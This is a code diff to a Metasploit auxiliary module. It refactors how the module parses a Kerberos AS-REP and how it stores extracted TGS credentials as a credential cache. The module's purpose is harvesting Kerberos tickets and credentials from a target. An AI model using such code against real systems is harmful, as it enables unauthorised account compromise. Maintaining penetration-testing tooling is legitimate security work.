@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{peer} - Parsing AS-REP...")
 
     session_key = extract_session_key(res, password_digest)
-    logon_time = extract_logon_time(res, password_digest)
+    logon_time = decrypt_kdc_as_rep_enc_part(res, password_digest).auth_time
     ticket = res.ticket
 
     pre_auth = []
@@ -141,9 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{peer} - Valid TGS-Response, extracting credentials...")
 
     cache = extract_kerb_creds(res, sub_key.value)
-
-    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
-    print_good("#{peer} - MIT Credential Cache saved on #{path}")
+    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(cache, framework_module: self, host: rhost)
   end
 
   def warn_error(res)
